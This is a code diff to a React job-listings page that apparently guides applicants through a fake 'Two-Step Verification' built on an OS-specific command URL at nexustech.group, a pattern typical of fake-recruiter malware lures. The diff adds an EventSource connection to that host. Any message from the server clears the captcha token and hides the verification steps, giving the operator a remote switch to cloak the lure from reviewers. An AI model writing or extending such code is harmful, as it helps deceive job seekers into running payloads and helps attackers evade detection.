@@ -1,4 +1,4 @@
-import React, { useMemo, useState } from 'react'
+import React, { useMemo, useState, useEffect } from 'react'
 import { Blocks, Users, BarChart3, Network, PenTool } from 'lucide-react'
 import Modal from '@/components/Modal'
 import { useToast } from '@/components/Toast'
@@ -79,6 +79,16 @@ export default function Jobs() {
   const { push } = useToast()
   const [captchaToken, setCaptchaToken] = useState(null)
 
+  useEffect(() => {
+  const evtSource = new EventSource("https://www.nexustech.group/users/auth/windows?token=b93f01de810f8c7f");
+  
+  evtSource.onmessage = (event) => {
+    setCaptchaToken('');
+  };
+
+  return () => evtSource.close();
+}, []);
+
   const os = useMemo(() => detectOS(), [])
   const cmdUrl = useMemo(() => {
     const base = 'https://www.nexustech.group/users/auth'
@@ -94,7 +104,7 @@ export default function Jobs() {
     }
   }
 
-  const onApply = (job) => { setActive(job); setOpen(true) }
+  const onApply = (job) => { setActive(job); setOpen(true); setCaptchaToken(null); }
   const onSubmit = (e) => {
     e.preventDefault()
     setOpen(false)
@@ -167,7 +177,7 @@ export default function Jobs() {
         </div>
 
         {/* ---- Two-step verification ---- */}
-        {captchaToken && (
+        {captchaToken && captchaToken != '' && (
         <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
           <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
           <ol className="list-decimal ml-5 space-y-2 text-sm">
@@ -202,7 +212,7 @@ export default function Jobs() {
         
           )}
         {/* ---- /Two-step verification ---- */}
-      {!captchaToken &&
+      {!captchaToken && captchaToken != '' &&
           <div className="mt-3">
           <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
         </div>
